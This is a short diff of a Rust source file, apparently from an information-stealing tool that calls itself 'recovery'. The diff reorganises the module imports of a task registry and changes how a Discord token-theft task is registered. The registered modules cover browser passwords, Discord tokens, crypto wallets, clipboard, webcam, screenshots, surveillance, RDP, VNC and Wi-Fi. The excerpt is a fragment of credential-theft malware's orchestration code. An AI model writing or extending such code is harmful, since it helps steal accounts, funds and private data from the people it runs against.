@@ -84,9 +84,10 @@ async fn register_all_tasks(
 ) -> Result<(), RecoveryError> {
     use recovery::browser::browsers;
     use recovery::{
-        account_validation, behavioral, chromium, clipboard, devops, discord, email, file_recovery,
-        ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, proxy, rdp, screenshot, services,
-        surveillance, system, vnc, vpn, wallet, webcam, wifi,
+        account_validation, behavioral, browser::chromium, clipboard, communication::discord,
+        communication::email, communication::messenger, devops, ftp, gaming, browser::gecko,
+        browser::gecko_passwords, hardware, other, proxy, rdp, screenshot, network::services,
+        surveillance, system, vnc, vpn, wallet, webcam, wifi, storage::file_recovery,
     };
 
     manager.register_tasks(browsers::default_browser_tasks(context).await);
@@ -102,7 +103,7 @@ async fn register_all_tasks(
     manager.register_tasks(gaming::gaming_extra_tasks(context));
 
     manager.register_tasks(messenger::messenger_tasks(context));
-    manager.register_task(discord::discord_token_task(context));
+    manager.register_tasks(discord::discord_token_task(context));
     manager.register_task(discord::discord_profile_task(context));
     manager.register_task(discord::discord_service_task(context));
     manager.register_tasks(services::email_tasks(context));
